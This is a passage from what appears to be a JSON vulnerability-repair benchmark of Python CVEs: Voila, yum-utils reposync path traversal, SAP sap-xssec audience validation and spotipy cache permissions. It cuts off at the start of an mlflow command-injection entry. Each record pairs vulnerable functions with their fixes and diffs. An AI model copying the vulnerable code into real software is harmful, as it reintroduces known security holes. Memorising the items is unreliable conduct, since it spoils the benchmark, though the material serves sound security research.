contents_manager=self.contents_manager,\n            config_manager=self.config_manager,\n            cookie_secret=self.cookie_secret,\n            authorizer=self.authorizer,\n            identity_provider=self.identity_provider,\n            kernel_websocket_connection_class=self.kernel_websocket_connection_class,\n            login_url=url_path_join(self.base_url, \"/login\"),\n            mathjax_config=self.mathjax_config,\n            mathjax_url=self.mathjax_url,\n        )\n        settings[self.name] = self  # Why???\n\n        return settings"
      }
    ],
    "vul_patch": "--- a/voila/app.py\n+++ b/voila/app.py\n@@ -88,7 +88,6 @@\n             autoreload=self.autoreload,\n             voila_jinja2_env=env,\n             jinja2_env=server_env,\n-            static_path=\"/\",\n             server_root_dir=\"/\",\n             contents_manager=self.contents_manager,\n             config_manager=self.config_manager,\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2018-10897",
    "cve_description": "A directory traversal issue was found in reposync, a part of yum-utils, where reposync fails to sanitize paths in remote repository configuration files. If an attacker controls a repository, they may be able to copy files outside of the destination directory on the targeted system via path traversal. If reposync is running with heightened privileges on a targeted system, this flaw could potentially result in system compromise via the overwriting of critical system files. Version 1.1.31 and older are believed to be affected.",
    "cwe_info": {
      "CWE-59": {
        "name": "Improper Link Resolution Before File Access ('Link Following')",
        "description": "The product attempts to access a file based on the filename, but it does not properly prevent that filename from identifying a link or shortcut that resolves to an unintended resource."
      }
    },
    "repo": "https://github.com/rpm-software-management/yum-utils",
    "patch_url": [
      "https://github.com/rpm-software-management/yum-utils/commit/6a8de061f8fdc885e74ebe8c94625bf53643b71c"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_325_1",
        "commit": "7554c01",
        "file_path": "reposync.py",
        "start_line": 77,
        "end_line": 120,
        "snippet": "def parseArgs():\n    usage = _(\"\"\"\n    Reposync is used to synchronize a remote yum repository to a local \n    directory using yum to retrieve the packages.\n    \n    %s [options]\n    \"\"\") % sys.argv[0]\n\n    parser = OptionParser(usage=usage)\n    parser.add_option(\"-c\", \"--config\", default='/etc/yum.conf',\n        help=_('config file to use (defaults to /etc/yum.conf)'))\n    parser.add_option(\"-a\", \"--arch\", default=None,\n        help=_('act as if running the specified arch (default: current arch, note: does not override $releasever. x86_64 is a superset for i*86.)'))\n    parser.add_option(\"--source\", default=False, dest=\"source\", action=\"store_true\",\n                      help=_('operate on source packages'))\n    parser.add_option(\"-r\", \"--repoid\", default=[], action='append',\n        help=_(\"specify repo ids to query, can be specified multiple times (default is all enabled)\"))\n    parser.add_option(\"-e\", \"--cachedir\",\n        help=_(\"directory in which to store metadata\"))\n    parser.add_option(\"-t\", \"--tempcache\", default=False, action=\"store_true\",\n        help=_(\"Use a temp dir for storing/accessing yum-cache\"))\n    parser.add_option(\"-d\", \"--delete\", default=False, action=\"store_true\",\n        help=_(\"delete local packages no longer present in repository\"))\n    parser.add_option(\"-p\", \"--download_path\", dest='destdir',\n        default=os.getcwd(), help=_(\"Path to download packages to: defaults to current dir\"))\n    parser.add_option(\"--norepopath\", dest='norepopath', default=False, action=\"store_true\",\n        help=_(\"Don't add the reponame to the download path. Can only be used when syncing a single repository (default is to add the reponame)\"))\n    parser.add_option(\"-g\", \"--gpgcheck\", default=False, action=\"store_true\",\n        help=_(\"Remove packages that fail GPG signature checking after downloading\"))\n    parser.add_option(\"-u\", \"--urls\", default=False, action=\"store_true\",\n        help=_(\"Just list urls of what would be downloaded, don't download\"))\n    parser.add_option(\"-n\", \"--newest-only\", dest='newest', default=False, action=\"store_true\",\n        help=_(\"Download only newest packages per-repo\"))\n    parser.add_option(\"-q\", \"--quiet\", default=False, action=\"store_true\",\n        help=_(\"Output as little as possible\"))\n    parser.add_option(\"-l\", \"--plugins\", default=False, action=\"store_true\",\n        help=_(\"enable yum plugin support\"))\n    parser.add_option(\"-m\", \"--downloadcomps\", default=False, action=\"store_true\",\n        help=_(\"also download comps.xml\"))\n    parser.add_option(\"\", \"--download-metadata\", dest=\"downloadmd\",\n        default=False, action=\"store_true\",\n        help=_(\"download all the non-default metadata\"))\n    (opts, args) = parser.parse_args()\n    return (opts, args)"
      },
      {
        "id": "vul_py_325_2",
        "commit": "7554c01",
        "file_path": "reposync.py",
        "start_line": 123,
        "end_line": 325,
        "snippet": "def main():\n    (opts, dummy) = parseArgs()\n\n    if not os.path.exists(opts.destdir) and not opts.urls:\n        try:\n            os.makedirs(opts.destdir)\n        except OSError, e:\n            print >> sys.stderr, _(\"Error: Cannot create destination dir %s\") % opts.destdir\n            sys.exit(1)\n\n    if not os.access(opts.destdir, os.W_OK) and not opts.urls:\n        print >> sys.stderr, _(\"Error: Cannot write to  destination dir %s\") % opts.destdir\n        sys.exit(1)\n\n    my = RepoSync(opts=opts)\n    my.doConfigSetup(fn=opts.config, init_plugins=opts.plugins)\n\n    # Force unprivileged users to have a private temporary cachedir\n    # if they've not given an explicit cachedir\n    if os.getuid() != 0 and not opts.cachedir:\n        opts.tempcache = True\n\n    if opts.tempcache:\n        if not my.setCacheDir(force=True, reuse=False):\n            print >> sys.stderr, _(\"Error: Could not make cachedir, exiting\")\n            sys.exit(50)\n        my.conf.uid = 1 # force locking of user cache\n    elif opts.cachedir:\n        my.repos.setCacheDir(opts.cachedir)\n\n    # Lock if they've not given an explicit cachedir\n    if not opts.cachedir:\n        try:\n            my.doLock()\n        except yum.Errors.LockError, e:\n            print >> sys.stderr, _(\"Error: %s\") % e\n            sys.exit(50)\n\n    #  Use progress bar display when downloading repo metadata\n    # and package files ... needs to be setup before .repos (ie. RHN/etc.).\n    if not opts.quiet:\n        my.repos.setProgressBar(TextMeter(fo=sys.stdout), TextMultiFileMeter(fo=sys.stdout))\n    my.doRepoSetup()\n\n    if len(opts.repoid) > 0:\n        myrepos = []\n\n        # find the ones we want\n        for glob in opts.repoid:\n            add_repos = my.repos.findRepos(glob)\n            if not add_repos:\n                print >> sys.stderr, _(\"Warning: cannot find repository %s\") % glob\n                continue\n            myrepos.extend(add_repos)\n\n        if not myrepos:\n            print >> sys.stderr, _(\"No repositories found\")\n            sys.exit(1)\n\n        # disable them all\n        for repo in my.repos.repos.values():\n            repo.disable()\n\n        # enable the ones we like\n        for repo in myrepos:\n            repo.enable()\n\n    # --norepopath can only be sensibly used with a single repository:\n    if len(my.repos.listEnabled()) > 1 and opts.norepopath:\n        print >> sys.stderr, _(\"Error: Can't use --norepopath with multiple repositories\")\n        sys.exit(1)\n\n    try:\n        arches = rpmUtils.arch.getArchList(opts.arch)\n        if opts.source:\n            arches += ['src']\n        my.doSackSetup(arches)\n    except yum.Errors.RepoError, e:\n        print >> sys.stderr, _(\"Error setting up repositories: %s\") % e\n        # maybe this shouldn't be entirely fatal\n        sys.exit(1)\n\n    exit_code = 0\n    for repo in my.repos.listEnabled():\n        reposack = ListPackageSack(my.pkgSack.returnPackages(repoid=repo.id))\n\n        if opts.newest:\n            download_list = reposack.returnNewestByNameArch()\n        else:\n            download_list = list(reposack)\n\n        if opts.norepopath:\n            local_repo_path = opts.destdir\n        else:\n            local_repo_path = opts.destdir + '/' + repo.id\n\n        if opts.delete and os.path.exists(local_repo_path):\n            current_pkgs = localpkgs(local_repo_path)\n\n            download_set = {}\n            for pkg in download_list:\n                rpmname = os.path.basename(pkg.remote_path)\n                download_set[rpmname] = 1\n\n            for pkg in current_pkgs:\n                if pkg in download_set:\n                    continue\n\n                if not opts.quiet:\n                    my.logger.info(\"Removing obsolete %s\", pkg)\n                os.unlink(current_pkgs[pkg]['path'])\n\n        if opts.downloadcomps or opts.downloadmd:\n\n            if not os.path.exists(local_repo_path):\n                try:\n                    os.makedirs(local_repo_path)\n                except IOError, e:\n                    my.logger.error(\"Could not make repo subdir: %s\" % e)\n                    my.closeRpmDB()\n                    sys.exit(1)\n\n            if opts.downloadcomps:\n                wanted_types = ['group']\n\n            if opts.downloadmd:\n                wanted_types = repo.repoXML.fileTypes()\n\n            for ftype in repo.repoXML.fileTypes():\n                if ftype in ['primary', 'primary_db', 'filelists',\n                             'filelists_db', 'other', 'other_db']:\n                    continue\n                if ftype not in wanted_types:\n                    continue\n\n                try:\n                    resultfile = repo.retrieveMD(ftype)\n                    basename = os.path.basename(resultfile)\n                    if ftype == 'group' and opts.downloadcomps: # for compat with how --downloadcomps saved the comps file always as comps.xml\n                        basename = 'comps.xml'\n                    shutil.copyfile(resultfile, \"%s/%s\" % (local_repo_path, basename))\n                except yum.Errors.RepoMDError, e:\n                    if not opts.quiet:\n                        my.logger.error(\"Unable to fetch metadata: %s\" % e)\n\n        remote_size = 0\n        if not opts.urls:\n            for pkg in download_list:\n                local = os.path.join(local_repo_path, pkg.remote_path)\n                sz = int(pkg.returnSimple('packagesize'))\n                if os.path.exists(local) and os.path.getsize(local) == sz:\n                    continue\n                remote_size += sz\n\n        if hasattr(urlgrabber.progress, 'text_meter_total_size'):\n            urlgrabber.progress.text_meter_total_size(remote_size)\n\n        download_list.sort(key=lambda pkg: pkg.name)\n        if opts.urls:\n            for pkg in download_list:\n                local = os.path.join(local_repo_path, pkg.remote_path)\n                if not (os.path.exists(local) and my.verifyPkg(local, pkg, False)):\n                    print urljoin(pkg.repo.urls[0], pkg.remote_path)\n            continue\n\n        # create dest dir\n        if not os.path.exists(local_repo_path):\n            os.makedirs(local_repo_path)\n\n        # set localpaths\n        for pkg in download_list:\n            pkg.localpath = os.path.join(local_repo_path, pkg.remote_path)\n            pkg.repo.copy_local = True\n            pkg.repo.cache = 0\n            localdir = os.path.dirname(pkg.localpath)\n            if not os.path.exists(localdir):\n                os.makedirs(localdir)\n\n        # use downloader from YumBase\n        probs = my.downloadPkgs(download_list)\n        if probs:\n            exit_code = 1\n            for key in probs:\n                for error in probs[key]:\n                    my.logger.error('%s: %s', key, error)\n\n        if opts.gpgcheck:\n            for pkg in download_list:\n                result, error = my.sigCheckPkg(pkg)\n                if result != 0:\n                    rpmfn = os.path.basename(pkg.remote_path)\n                    if result == 1:\n                        my.logger.warning('Removing %s, due to missing GPG key.' % rpmfn)\n                    elif result == 2:\n                        my.logger.warning('Removing %s due to failed signature check.' % rpmfn)\n                    else:\n                        my.logger.warning('Removing %s due to failed signature check: %s' % rpmfn)\n                    os.unlink(pkg.localpath)\n                    exit_code = 1\n                    continue\n\n    my.closeRpmDB()\n    sys.exit(exit_code)"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_325_1",
        "commit": "6a8de061f8fdc885e74ebe8c94625bf53643b71c",
        "file_path": "reposync.py",
        "start_line": 83,
        "end_line": 130,
        "snippet": "def parseArgs():\n    usage = _(\"\"\"\n    Reposync is used to synchronize a remote yum repository to a local \n    directory using yum to retrieve the packages.\n    \n    %s [options]\n    \"\"\") % sys.argv[0]\n\n    parser = OptionParser(usage=usage)\n    parser.add_option(\"-c\", \"--config\", default='/etc/yum.conf',\n        help=_('config file to use (defaults to /etc/yum.conf)'))\n    parser.add_option(\"-a\", \"--arch\", default=None,\n        help=_('act as if running the specified arch (default: current arch, note: does not override $releasever. x86_64 is a superset for i*86.)'))\n    parser.add_option(\"--source\", default=False, dest=\"source\", action=\"store_true\",\n                      help=_('operate on source packages'))\n    parser.add_option(\"-r\", \"--repoid\", default=[], action='append',\n        help=_(\"specify repo ids to query, can be specified multiple times (default is all enabled)\"))\n    parser.add_option(\"-e\", \"--cachedir\",\n        help=_(\"directory in which to store metadata\"))\n    parser.add_option(\"-t\", \"--tempcache\", default=False, action=\"store_true\",\n        help=_(\"Use a temp dir for storing/accessing yum-cache\"))\n    parser.add_option(\"-d\", \"--delete\", default=False, action=\"store_true\",\n        help=_(\"delete local packages no longer present in repository\"))\n    parser.add_option(\"-p\", \"--download_path\", dest='destdir',\n        default=os.getcwd(), help=_(\"Path to download packages to: defaults to current dir\"))\n    parser.add_option(\"--norepopath\", dest='norepopath', default=False, action=\"store_true\",\n        help=_(\"Don't add the reponame to the download path. Can only be used when syncing a single repository (default is to add the reponame)\"))\n    parser.add_option(\"-g\", \"--gpgcheck\", default=False, action=\"store_true\",\n        help=_(\"Remove packages that fail GPG signature checking after downloading\"))\n    parser.add_option(\"-u\", \"--urls\", default=False, action=\"store_true\",\n        help=_(\"Just list urls of what would be downloaded, don't download\"))\n    parser.add_option(\"-n\", \"--newest-only\", dest='newest', default=False, action=\"store_true\",\n        help=_(\"Download only newest packages per-repo\"))\n    parser.add_option(\"-q\", \"--quiet\", default=False, action=\"store_true\",\n        help=_(\"Output as little as possible\"))\n    parser.add_option(\"-l\", \"--plugins\", default=False, action=\"store_true\",\n        help=_(\"enable yum plugin support\"))\n    parser.add_option(\"-m\", \"--downloadcomps\", default=False, action=\"store_true\",\n        help=_(\"also download comps.xml\"))\n    parser.add_option(\"\", \"--download-metadata\", dest=\"downloadmd\",\n        default=False, action=\"store_true\",\n        help=_(\"download all the non-default metadata\"))\n    parser.add_option(\"\", \"--allow-path-traversal\", default=False,\n        action=\"store_true\",\n        help=_(\"Allow packages stored outside their repo directory to be synced \"\n               \"(UNSAFE, USE WITH CAUTION!)\"))\n    (opts, args) = parser.parse_args()\n    return (opts, args)"
      },
      {
        "id": "fix_py_325_2",
        "commit": "6a8de061f8fdc885e74ebe8c94625bf53643b71c",
        "file_path": "reposync.py",
        "start_line": 133,
        "end_line": 359,
        "snippet": "def main():\n    (opts, dummy) = parseArgs()\n\n    if not os.path.exists(opts.destdir) and not opts.urls:\n        try:\n            os.makedirs(opts.destdir)\n        except OSError, e:\n            print >> sys.stderr, _(\"Error: Cannot create destination dir %s\") % opts.destdir\n            sys.exit(1)\n\n    if not os.access(opts.destdir, os.W_OK) and not opts.urls:\n        print >> sys.stderr, _(\"Error: Cannot write to  destination dir %s\") % opts.destdir\n        sys.exit(1)\n\n    my = RepoSync(opts=opts)\n    my.doConfigSetup(fn=opts.config, init_plugins=opts.plugins)\n\n    # Force unprivileged users to have a private temporary cachedir\n    # if they've not given an explicit cachedir\n    if os.getuid() != 0 and not opts.cachedir:\n        opts.tempcache = True\n\n    if opts.tempcache:\n        if not my.setCacheDir(force=True, reuse=False):\n            print >> sys.stderr, _(\"Error: Could not make cachedir, exiting\")\n            sys.exit(50)\n        my.conf.uid = 1 # force locking of user cache\n    elif opts.cachedir:\n        my.repos.setCacheDir(opts.cachedir)\n\n    # Lock if they've not given an explicit cachedir\n    if not opts.cachedir:\n        try:\n            my.doLock()\n        except yum.Errors.LockError, e:\n            print >> sys.stderr, _(\"Error: %s\") % e\n            sys.exit(50)\n\n    #  Use progress bar display when downloading repo metadata\n    # and package files ... needs to be setup before .repos (ie. RHN/etc.).\n    if not opts.quiet:\n        my.repos.setProgressBar(TextMeter(fo=sys.stdout), TextMultiFileMeter(fo=sys.stdout))\n    my.doRepoSetup()\n\n    if len(opts.repoid) > 0:\n        myrepos = []\n\n        # find the ones we want\n        for glob in opts.repoid:\n            add_repos = my.repos.findRepos(glob)\n            if not add_repos:\n                print >> sys.stderr, _(\"Warning: cannot find repository %s\") % glob\n                continue\n            myrepos.extend(add_repos)\n\n        if not myrepos:\n            print >> sys.stderr, _(\"No repositories found\")\n            sys.exit(1)\n\n        # disable them all\n        for repo in my.repos.repos.values():\n            repo.disable()\n\n        # enable the ones we like\n        for repo in myrepos:\n            repo.enable()\n\n    # --norepopath can only be sensibly used with a single repository:\n    if len(my.repos.listEnabled()) > 1 and opts.norepopath:\n        print >> sys.stderr, _(\"Error: Can't use --norepopath with multiple repositories\")\n        sys.exit(1)\n\n    try:\n        arches = rpmUtils.arch.getArchList(opts.arch)\n        if opts.source:\n            arches += ['src']\n        my.doSackSetup(arches)\n    except yum.Errors.RepoError, e:\n        print >> sys.stderr, _(\"Error setting up repositories: %s\") % e\n        # maybe this shouldn't be entirely fatal\n        sys.exit(1)\n\n    exit_code = 0\n    for repo in my.repos.listEnabled():\n        reposack = ListPackageSack(my.pkgSack.returnPackages(repoid=repo.id))\n\n        if opts.newest:\n            download_list = reposack.returnNewestByNameArch()\n        else:\n            download_list = list(reposack)\n\n        if opts.norepopath:\n            local_repo_path = opts.destdir\n        else:\n            local_repo_path = opts.destdir + '/' + repo.id\n\n        # Ensure we don't traverse out of local_repo_path by dropping any\n        # packages whose remote_path is absolute or contains up-level\n        # references (unless explicitly allowed).\n        # See RHBZ#1600221 for details.\n        if not opts.allow_path_traversal:\n            newlist = []\n            skipped = False\n            for pkg in download_list:\n                if is_subpath(pkg.remote_path, local_repo_path):\n                    newlist.append(pkg)\n                    continue\n                my.logger.warning(\n                    _('WARNING: skipping package %s: remote path \"%s\" not '\n                      'within repodir, unsafe to mirror locally')\n                    % (pkg, pkg.remote_path)\n                )\n                skipped = True\n            if skipped:\n                my.logger.info(\n                    _('You can enable unsafe remote paths by using '\n                      '--allow-path-traversal (see reposync(1) for details)')\n                )\n            download_list = newlist\n\n        if opts.delete and os.path.exists(local_repo_path):\n            current_pkgs = localpkgs(local_repo_path)\n\n            download_set = {}\n            for pkg in download_list:\n                rpmname = os.path.basename(pkg.remote_path)\n                download_set[rpmname] = 1\n\n            for pkg in current_pkgs:\n                if pkg in download_set:\n                    continue\n\n                if not opts.quiet:\n                    my.logger.info(\"Removing obsolete %s\", pkg)\n                os.unlink(current_pkgs[pkg]['path'])\n\n        if opts.downloadcomps or opts.downloadmd:\n\n            if not os.path.exists(local_repo_path):\n                try:\n                    os.makedirs(local_repo_path)\n                except IOError, e:\n                    my.logger.error(\"Could not make repo subdir: %s\" % e)\n                    my.closeRpmDB()\n                    sys.exit(1)\n\n            if opts.downloadcomps:\n                wanted_types = ['group']\n\n            if opts.downloadmd:\n                wanted_types = repo.repoXML.fileTypes()\n\n            for ftype in repo.repoXML.fileTypes():\n                if ftype in ['primary', 'primary_db', 'filelists',\n                             'filelists_db', 'other', 'other_db']:\n                    continue\n                if ftype not in wanted_types:\n                    continue\n\n                try:\n                    resultfile = repo.retrieveMD(ftype)\n                    basename = os.path.basename(resultfile)\n                    if ftype == 'group' and opts.downloadcomps: # for compat with how --downloadcomps saved the comps file always as comps.xml\n                        basename = 'comps.xml'\n                    shutil.copyfile(resultfile, \"%s/%s\" % (local_repo_path, basename))\n                except yum.Errors.RepoMDError, e:\n                    if not opts.quiet:\n                        my.logger.error(\"Unable to fetch metadata: %s\" % e)\n\n        remote_size = 0\n        if not opts.urls:\n            for pkg in download_list:\n                local = os.path.join(local_repo_path, pkg.remote_path)\n                sz = int(pkg.returnSimple('packagesize'))\n                if os.path.exists(local) and os.path.getsize(local) == sz:\n                    continue\n                remote_size += sz\n\n        if hasattr(urlgrabber.progress, 'text_meter_total_size'):\n            urlgrabber.progress.text_meter_total_size(remote_size)\n\n        download_list.sort(key=lambda pkg: pkg.name)\n        if opts.urls:\n            for pkg in download_list:\n                local = os.path.join(local_repo_path, pkg.remote_path)\n                if not (os.path.exists(local) and my.verifyPkg(local, pkg, False)):\n                    print urljoin(pkg.repo.urls[0], pkg.remote_path)\n            continue\n\n        # create dest dir\n        if not os.path.exists(local_repo_path):\n            os.makedirs(local_repo_path)\n\n        # set localpaths\n        for pkg in download_list:\n            pkg.localpath = os.path.join(local_repo_path, pkg.remote_path)\n            pkg.repo.copy_local = True\n            pkg.repo.cache = 0\n            localdir = os.path.dirname(pkg.localpath)\n            if not os.path.exists(localdir):\n                os.makedirs(localdir)\n\n        # use downloader from YumBase\n        probs = my.downloadPkgs(download_list)\n        if probs:\n            exit_code = 1\n            for key in probs:\n                for error in probs[key]:\n                    my.logger.error('%s: %s', key, error)\n\n        if opts.gpgcheck:\n            for pkg in download_list:\n                result, error = my.sigCheckPkg(pkg)\n                if result != 0:\n                    rpmfn = os.path.basename(pkg.remote_path)\n                    if result == 1:\n                        my.logger.warning('Removing %s, due to missing GPG key.' % rpmfn)\n                    elif result == 2:\n                        my.logger.warning('Removing %s due to failed signature check.' % rpmfn)\n                    else:\n                        my.logger.warning('Removing %s due to failed signature check: %s' % rpmfn)\n                    os.unlink(pkg.localpath)\n                    exit_code = 1\n                    continue\n\n    my.closeRpmDB()\n    sys.exit(exit_code)"
      },
      {
        "id": "fix_py_325_3",
        "commit": "6a8de061f8fdc885e74ebe8c94625bf53643b71c",
        "file_path": "reposync.py",
        "start_line": 77,
        "end_line": 82,
        "snippet": "def is_subpath(path, root):\n    root = os.path.realpath(root)\n    path = os.path.realpath(os.path.join(root, path))\n    # join() is used below to ensure root ends with a slash\n    return path.startswith(os.path.join(root, ''))\n"
      }
    ],
    "vul_patch": "--- a/reposync.py\n+++ b/reposync.py\n@@ -40,5 +40,9 @@\n     parser.add_option(\"\", \"--download-metadata\", dest=\"downloadmd\",\n         default=False, action=\"store_true\",\n         help=_(\"download all the non-default metadata\"))\n+    parser.add_option(\"\", \"--allow-path-traversal\", default=False,\n+        action=\"store_true\",\n+        help=_(\"Allow packages stored outside their repo directory to be synced \"\n+               \"(UNSAFE, USE WITH CAUTION!)\"))\n     (opts, args) = parser.parse_args()\n     return (opts, args)\n\n--- a/reposync.py\n+++ b/reposync.py\n@@ -93,6 +93,30 @@\n             local_repo_path = opts.destdir\n         else:\n             local_repo_path = opts.destdir + '/' + repo.id\n+\n+        # Ensure we don't traverse out of local_repo_path by dropping any\n+        # packages whose remote_path is absolute or contains up-level\n+        # references (unless explicitly allowed).\n+        # See RHBZ#1600221 for details.\n+        if not opts.allow_path_traversal:\n+            newlist = []\n+            skipped = False\n+            for pkg in download_list:\n+                if is_subpath(pkg.remote_path, local_repo_path):\n+                    newlist.append(pkg)\n+                    continue\n+                my.logger.warning(\n+                    _('WARNING: skipping package %s: remote path \"%s\" not '\n+                      'within repodir, unsafe to mirror locally')\n+                    % (pkg, pkg.remote_path)\n+                )\n+                skipped = True\n+            if skipped:\n+                my.logger.info(\n+                    _('You can enable unsafe remote paths by using '\n+                      '--allow-path-traversal (see reposync(1) for details)')\n+                )\n+            download_list = newlist\n \n         if opts.delete and os.path.exists(local_repo_path):\n             current_pkgs = localpkgs(local_repo_path)\n\n--- /dev/null\n+++ b/reposync.py\n@@ -0,0 +1,5 @@\n+def is_subpath(path, root):\n+    root = os.path.realpath(root)\n+    path = os.path.realpath(os.path.join(root, path))\n+    # join() is used below to ensure root ends with a slash\n+    return path.startswith(os.path.join(root, ''))\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2023-50423",
    "cve_description": "SAP\u00a0BTP\u00a0Security Services Integration Library ([Python]\u00a0sap-xssec) - versions < 4.1.0, allow under certain conditions an escalation of privileges. On successful exploitation, an unauthenticated attacker can obtain arbitrary permissions within the application.",
    "cwe_info": {
      "CWE-285": {
        "name": "Improper Authorization",
        "description": "The product does not perform or incorrectly performs an authorization check when an actor attempts to access a resource or perform an action."
      },
      "CWE-250": {
        "name": "Execution with Unnecessary Privileges",
        "description": "The product performs an operation at a privilege level that is higher than the minimum level required, which creates new weaknesses or amplifies the consequences of other weaknesses."
      },
      "CWE-269": {
        "name": "Improper Privilege Management",
        "description": "The product does not properly assign, modify, track, or check privileges for an actor, creating an unintended sphere of control for that actor."
      }
    },
    "repo": "https://github.com/SAP/cloud-pysec",
    "patch_url": [
      "https://github.com/SAP/cloud-pysec/commit/d90c9e0733fa9af68bd8ea0b1cf023cf482163ef"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_183_1",
        "commit": "77c8216",
        "file_path": "sap/xssec/security_context_ias.py",
        "start_line": 61,
        "end_line": 68,
        "snippet": "    def validate_audience(self):\n        \"\"\"\n        check `aud` in jwt token\n        \"\"\"\n        validation_result = self.audience_validator.validate_token(audiences_from_token=self.token_payload[\"aud\"])\n        if validation_result is False:\n            raise RuntimeError('Audience Validation Failed')\n        return self"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_183_1",
        "commit": "d90c9e0",
        "file_path": "sap/xssec/security_context_ias.py",
        "start_line": 61,
        "end_line": 72,
        "snippet": "    def validate_audience(self):\n        \"\"\"\n        check `aud` in jwt token\n        \"\"\"\n\n        # Make sure `aud` is a list\n        aud = [self.token_payload[\"aud\"]] if isinstance(self.token_payload[\"aud\"], str) else self.token_payload[\"aud\"]\n        \n        validation_result = self.audience_validator.validate_token(audiences_from_token=aud)\n        if validation_result is False:\n            raise RuntimeError('Audience Validation Failed')\n        return self"
      }
    ],
    "vul_patch": "--- a/sap/xssec/security_context_ias.py\n+++ b/sap/xssec/security_context_ias.py\n@@ -2,7 +2,11 @@\n         \"\"\"\n         check `aud` in jwt token\n         \"\"\"\n-        validation_result = self.audience_validator.validate_token(audiences_from_token=self.token_payload[\"aud\"])\n+\n+        # Make sure `aud` is a list\n+        aud = [self.token_payload[\"aud\"]] if isinstance(self.token_payload[\"aud\"], str) else self.token_payload[\"aud\"]\n+        \n+        validation_result = self.audience_validator.validate_token(audiences_from_token=aud)\n         if validation_result is False:\n             raise RuntimeError('Audience Validation Failed')\n         return self\n\n",
    "poc_patch": null,
    "unit_test_cmd": null
  },
  {
    "cve_id": "CVE-2025-27154",
    "cve_description": "Spotipy is a lightweight Python library for the Spotify Web API. The `CacheHandler` class creates a cache file to store the auth token. Prior to version 2.25.1, the file created has `rw-r--r--` (644) permissions by default, when it could be locked down to `rw-------` (600) permissions. This leads to overly broad exposure of the spotify auth token. If this token can be read by an attacker (another user on the machine, or a process running as another user), it can be used to perform administrative actions on the Spotify account, depending on the scope granted to the token. Version 2.25.1 tightens the cache file permissions.",
    "cwe_info": {
      "CWE-276": {
        "name": "Incorrect Default Permissions",
        "description": "During installation, installed file permissions are set to allow anyone to modify those files."
      }
    },
    "repo": "https://github.com/spotipy-dev/spotipy",
    "patch_url": [
      "https://github.com/spotipy-dev/spotipy/commit/1ca453f6ef87a2a9e9876f52b6cb38d13532ccf2"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_61_1",
        "commit": "668158f",
        "file_path": "spotipy/cache_handler.py",
        "start_line": 93,
        "end_line": 98,
        "snippet": "    def save_token_to_cache(self, token_info):\n        try:\n            with open(self.cache_path, \"w\", encoding='utf-8') as f:\n                f.write(json.dumps(token_info, cls=self.encoder_cls))\n        except OSError:\n            logger.warning(f\"Couldn't write token to cache at: {self.cache_path}\")"
      }
    ],
    "fix_func": [
      {
        "id": "fix_py_61_1",
        "commit": "1ca453f",
        "file_path": "spotipy/cache_handler.py",
        "start_line": 93,
        "end_line": 102,
        "snippet": "    def save_token_to_cache(self, token_info):\n        try:\n            with open(self.cache_path, \"w\", encoding='utf-8') as f:\n                f.write(json.dumps(token_info, cls=self.encoder_cls))\n            # https://github.com/spotipy-dev/spotipy/security/advisories/GHSA-pwhh-q4h6-w599\n            os.chmod(self.cache_path, 0o600)\n        except OSError:\n            logger.warning(f\"Couldn't write token to cache at: {self.cache_path}\")\n        except FileNotFoundError:\n            logger.warning(f\"Couldn't set permissions to cache file at: {self.cache_path}\")"
      }
    ],
    "vul_patch": "--- a/spotipy/cache_handler.py\n+++ b/spotipy/cache_handler.py\n@@ -2,5 +2,9 @@\n         try:\n             with open(self.cache_path, \"w\", encoding='utf-8') as f:\n                 f.write(json.dumps(token_info, cls=self.encoder_cls))\n+            # https://github.com/spotipy-dev/spotipy/security/advisories/GHSA-pwhh-q4h6-w599\n+            os.chmod(self.cache_path, 0o600)\n         except OSError:\n             logger.warning(f\"Couldn't write token to cache at: {self.cache_path}\")\n+        except FileNotFoundError:\n+            logger.warning(f\"Couldn't set permissions to cache file at: {self.cache_path}\")\n\n",
    "poc_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2025-27154:latest\n# bash /workspace/fix-run.sh\nset -e\n\ncd /workspace/spotipy\ngit apply --whitespace=nowarn /workspace/test.patch /workspace/fix.patch\n/workspace/PoC_env/CVE-2025-27154/bin/python  hand_test.py\n",
    "unit_test_cmd": "#!/bin/bash\n# From ghcr.io/anonymous2578-data/cve-2025-27154:latest\n# bash /workspace/unit_test.sh\nset -e\n\ncd /workspace/spotipy\ngit apply --whitespace=nowarn /workspace/fix.patch\n/workspace/PoC_env/CVE-2025-27154/bin/python -m pytest -v tests/ -k \"not test_spotify_client_credentials_get_access_token\" "
  },
  {
    "cve_id": "CVE-2023-4033",
    "cve_description": "OS Command Injection in GitHub repository mlflow/mlflow prior to 2.6.0.",
    "cwe_info": {
      "CWE-94": {
        "name": "Improper Control of Generation of Code ('Code Injection')",
        "description": "The product constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment."
      },
      "CWE-77": {
        "name": "Improper Neutralization of Special Elements used in a Command ('Command Injection')",
        "description": "The product constructs all or part of a command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended command when it is sent to a downstream component."
      },
      "CWE-78": {
        "name": "Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')",
        "description": "The product constructs all or part of an OS command using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the intended OS command when it is sent to a downstream component."
      }
    },
    "repo": "https://github.com/mlflow/mlflow",
    "patch_url": [
      "https://github.com/mlflow/mlflow/commit/6dde93758d42455cb90ef324407919ed67668b9b"
    ],
    "programming_language": "Python",
    "vul_func": [
      {
        "id": "vul_py_235_1",
        "commit": "330bf0b",
        "file_path": "mlflow/pyfunc/backend.py",
        "start_line": 134,
        "end_line": 161,
